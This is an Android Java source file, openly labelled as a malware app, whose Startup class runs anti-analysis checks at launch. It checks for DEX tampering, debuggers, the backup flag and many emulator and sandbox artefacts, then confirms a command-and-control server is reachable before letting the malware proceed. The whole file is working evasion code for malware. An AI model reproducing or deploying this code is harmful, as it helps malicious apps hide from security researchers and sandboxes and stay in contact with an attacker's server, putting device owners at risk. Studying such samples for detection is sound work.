package com.example.malwareapp;

import android.app.Application;
import android.content.pm.ApplicationInfo;
import android.os.AsyncTask;

import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class Startup extends Application {
    public static String RANDOM = "RANDVsJb49qdH7ECRDd9PXuGDNuN2l02FeJ2wfXpmEvARAND";
    protected static boolean start = true;

    @Override
    public void onCreate(){
        super.onCreate();

        // Polymorphism
        System.out.println(RANDOM);

        ApplicationInfo ai;
        ZipEntry dexEntry;
        byte[] bytes = null;

        try {
            ai = getPackageManager().getApplicationInfo(getPackageName(), 0);
            dexEntry = new ZipFile(ai.sourceDir).getEntry("classes.dex");
            bytes = IOUtils.toByteArray(new ZipFile(ai.sourceDir).getInputStream(dexEntry));
        } catch (Exception ignored) { start = false; }

        CRC32 crc = new CRC32();
        crc.update(bytes);

        // Anti-Tampering
        boolean isTampered = crc.getValue() != Long.parseLong(getString(R.string.crc));

        // Anti-debugging check
        boolean isBeingDebugged = android.os.Debug.isDebuggerConnected();

        // Anti-backup check
        boolean isBackupAllowed = (getApplicationInfo().flags & ApplicationInfo.FLAG_ALLOW_BACKUP) != 0;

        boolean isVirtualized = false;

        // Anti-VM
        try {
            isVirtualized = Utils.hasGenyFiles() || Utils.hasEth0Interface() || Utils.hasQEmuProps(getApplicationContext()) ||
                    Utils.hasPipes() || Utils.hasEmulatorBuild(getApplicationContext()) || Utils.isOperatorNameAndroid(getApplicationContext()) ||
                    Utils.hasQEmuDrivers() || Utils.hasQEmuFiles() || Utils.hasTracerPid() || Utils.hasAppAnalysisPackage(getApplicationContext()) ||
                    Utils.hasTaintClass() || Utils.detectsensor(getApplicationContext());
        } catch (IOException e) {
            System.out.println("Anti-analysis: VM check failed");
        }

        if (isTampered){
            System.out.println("Anti-analysis: DEX was modified");
            start = false;
        }

        if (isBeingDebugged){
            System.out.println("Anti-analysis: Debugger executed");
            start = false;
        }

        if (isBackupAllowed){
            System.out.println("Anti-analysis: Backup allowed");
            start = false;
        }

        if (isVirtualized){
            System.out.println("Anti-analysis: VM detected");
            start = false;
        }

        // Connectivity check
        AliveAPI api = new AliveAPI();

        try { if (Integer.parseInt(api.execute(getString(R.string.c2) + "alive").get()) != 200) throw new Exception(); }
        catch (Exception e) {
            System.out.println("Anti-analysis: Server down");
            start = false;
        }
    }

    public class AliveAPI extends AsyncTask<String, String, String> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... params) {
            String urlString = params[0];

            try {
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setInstanceFollowRedirects(false);
                conn.setRequestMethod("GET");
                conn.setUseCaches(false);

                return Integer.toString(conn.getResponseCode());
            }
            catch (IOException e) {
                return "-1";
            }
        }
    }
}
